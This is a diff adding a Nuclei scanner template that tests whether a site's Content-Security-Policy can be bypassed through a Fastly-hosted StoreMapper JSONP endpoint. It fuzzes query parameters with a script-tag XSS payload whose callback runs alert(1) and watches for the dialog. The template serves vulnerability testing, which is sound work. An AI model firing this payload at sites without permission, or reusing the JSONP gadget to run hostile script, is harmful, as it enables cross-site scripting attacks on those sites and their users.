@@ -1,0 +1,55 @@
+id: fastly-storemapper-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Fastly StoreMapper
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,fastly-storemapper
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "fastly.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: fastly_storemapper_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "fastly_storemapper_csp_xss == true"
+# digest: 490a0046304402207291c5d7cd2276fab23aec0688aaa0c2464416f0bf15b28c0f16ff76ed713e4702200786b4ad573c08c87e1beb83cc3342e8b3372fb63e13402626cdb4ecb9dea9a9:922c64590222798bb761d5b6d8e72950
